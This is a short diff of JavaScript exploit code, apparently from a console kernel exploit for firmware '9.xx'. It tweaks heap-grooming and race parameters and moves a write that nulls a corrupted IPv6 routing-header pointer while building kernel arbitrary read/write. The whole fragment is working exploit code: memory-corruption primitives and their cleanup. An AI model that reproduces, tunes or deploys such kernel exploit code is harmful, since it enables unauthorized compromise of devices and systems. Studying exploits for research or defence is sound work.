@@ -136,7 +136,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 50; //TODO: check best value here for 9.xx
+const num_alias = 20; //TODO: check best value here for 9.xx
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
@@ -1465,10 +1465,9 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // pktopts.ip6po_rthdr = NULL
     const off_ip6po_rthdr = 0x68;
     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+    kmem.write64(r_rthdr_p, 0);
 
     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-
-    kmem.write64(r_rthdr_p, 0);
     kmem.write64(w_rthdr_p, 0);
 	log('corrupt pointers cleaned');
 
